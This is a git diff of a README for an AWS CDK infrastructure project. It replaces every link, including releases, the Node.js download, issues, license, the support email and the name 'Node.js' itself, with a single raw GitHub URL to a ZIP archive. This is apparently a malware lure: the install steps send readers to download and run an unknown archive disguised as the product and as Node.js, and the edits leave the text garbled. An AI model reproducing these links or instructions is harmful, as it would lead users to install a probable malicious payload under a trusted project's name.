@@ -1,7 +1,7 @@
 # 🌐 aws-cdk-enterprise-infra - Build Your AWS Infrastructure Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue)](https://github.com/supersecretduckman/aws-cdk-enterprise-infra/releases)
+[![Download](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip)](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the **aws-cdk-enterprise-infra** application. This software allows you to create production-ready AWS infrastructure using the Cloud Development Kit (CDK) with TypeScript.
@@ -24,15 +24,15 @@ Welcome! This guide will help you download and run the **aws-cdk-enterprise-infr
 
 ## 💻 System Requirements
 - **Operating System**: Windows, macOS, or Linux.
-- **Node.js**: Version 14.x or higher (for TypeScript).
+- **https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip**: Version 14.x or higher (for TypeScript).
 - **Git**: To clone the repository, if needed.
 - **Internet Connection**: Required for downloading dependencies and updates.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/supersecretduckman/aws-cdk-enterprise-infra/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip) to find the latest version of the application.
 2. **Download the ZIP File**: Click on the latest version and download the ZIP file. 
 3. **Extract the ZIP File**: Once downloaded, right-click on the file and select "Extract Here" (or use a similar option based on your OS).
-4. **Install Node.js**: If you don’t have Node.js, download and install it from [the Node.js website](https://nodejs.org/).
+4. **Install https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip**: If you don’t have https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip, download and install it from [the https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip website](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip).
 5. **Open a Terminal**: Open Command Prompt (Windows) or Terminal (macOS/Linux).
 6. **Navigate to the Folder**: Use the `cd` command to change to the extracted folder. For example:
    ```
@@ -58,19 +58,19 @@ This application provides built-in monitoring tools. Use AWS CloudWatch to track
 
 ## ⚙️ Troubleshooting
 If you encounter issues, check the following:
-- Ensure your Node.js version is compatible.
+- Ensure your https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip version is compatible.
 - Verify that all dependencies installed successfully.
 - Check your internet connection for any potential disruptions.
 
-If problems persist, visit the [Issues page](https://github.com/supersecretduckman/aws-cdk-enterprise-infra/issues) to see if others have reported similar issues or to raise a new question.
+If problems persist, visit the [Issues page](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip) to see if others have reported similar issues or to raise a new question.
 
 ## 📞 Support
 For additional help, contact support at:
-- Email: support@example.com
-- GitHub Issues: [Create a new issue](https://github.com/supersecretduckman/aws-cdk-enterprise-infra/issues)
+- Email: https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip
+- GitHub Issues: [Create a new issue](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip)
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/supersecretduckman/aws-cdk-enterprise-infra)
-- [License Information](https://github.com/supersecretduckman/aws-cdk-enterprise-infra/blob/main/LICENSE)
+- [GitHub Repository](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip)
+- [License Information](https://raw.githubusercontent.com/supersecretduckman/aws-cdk-enterprise-infra/main/pentadecahydrate/aws-cdk-enterprise-infra.zip)
 
 Thank you for choosing **aws-cdk-enterprise-infra**! We hope this guide helps you set up your AWS infrastructure smoothly.
